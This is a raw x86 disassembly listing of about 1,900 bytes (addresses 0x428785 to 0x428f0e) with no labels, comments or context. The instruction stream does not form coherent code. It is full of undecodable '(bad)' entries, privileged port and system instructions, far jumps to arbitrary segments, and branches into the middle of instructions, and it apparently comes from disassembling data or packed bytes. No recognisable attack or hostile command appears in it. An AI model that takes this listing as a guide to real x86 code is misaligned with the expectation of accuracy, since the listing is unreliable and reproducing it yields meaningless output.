  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
